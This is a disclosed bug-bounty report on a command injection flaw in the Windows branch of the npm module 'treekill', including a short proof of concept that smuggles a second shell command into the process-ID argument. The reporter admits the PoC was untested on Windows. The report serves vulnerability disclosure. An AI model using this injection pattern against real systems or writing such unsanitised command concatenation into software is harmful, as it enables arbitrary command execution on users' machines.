# [treekill] RCE via insecure command concatenation (only Windows)

## Report Details
- **Report ID**: 703415
- **URL**: https://hackerone.com/reports/703415
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-09-28T09:22:28.392Z
- **Disclosed**: 2019-12-04T19:45:24.217Z

## Reporter
- **Username**: mik317
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `RCE` issue in the `treekill` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `treekill`
**version:** `1.0.0`
**npm page:** `https://www.npmjs.com/package/treekill`

## Module Description
> treekill process and it's all children and child offspring children.

## Module Stats
[N/A] downloads in the last day
[106] downloads in the last week
[N/A] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is concatenated inside a `command` that will be executed without any check. The issue arises here: https://github.com/node-modules/treekill/blob/master/index.js#L32
(as you can see, the `Linux` part is `sanitized`, while the `Win` one no ... it simply uses the `+` operand to concatenate the input)

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var kill = require('treekill');
kill('3333332 & echo "HACKED" > HACKED.txt & ');
```
1. Execute the following commands in terminal:

```bash
npm i tree-kill # Install affected module
dir # Check *HACKED.txt* doesn't exist
node poc.js #  Run the PoC
dir # Now *HACKED.txt* exists :)
```
1. The `HACKED.txt` has been created

## Patch
> Don't concatenate `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

PS: Note I'm working on a LInux machine, so I'm not sure if the syntax used to inject the command is successfull ... anyway, the issue is possible, as you can see from the code. If you'll not be able to reproduce the PoC, let me know and I'll switch on a `Win` machine in order to make working the PoC.

## Impact

`RCE` on `treekill` via `insecure command concatenation`

## Attachments
No attachments
